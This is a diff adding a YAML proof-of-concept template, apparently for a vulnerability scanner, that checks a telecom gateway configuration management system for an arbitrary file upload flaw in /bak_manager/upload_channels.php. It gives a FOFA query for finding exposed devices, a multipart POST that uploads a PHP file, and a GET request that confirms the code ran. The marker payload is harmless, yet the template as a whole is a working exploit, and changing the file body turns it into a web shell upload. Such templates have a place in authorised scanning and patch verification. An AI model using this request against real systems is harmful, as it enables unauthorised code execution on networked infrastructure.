@@ -1,0 +1,32 @@
+id: poc-yaml-Telecom-gateway-upload-channels-php-anyfile-upload
+info:
+  name: 电信网关配置管理系统 upload_channels.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 电信网关配置管理系统
+  fofa: body="img/login_bg3.png" && body="系统登录"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /bak_manager/upload_channels.php
+  headers:
+    Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+  data: '------WebKitFormBoundaryssh7UfnPpGU7BXfK
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.php"
+
+    Content-Type: text/plain
+
+
+    <?php echo md5({{.t1}});unlink(__FILE__);?>
+
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK--'
+  expression: status_code == 200 && contains(body,"\"error\"")
+- method: GET
+  path: /bak_manager/{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
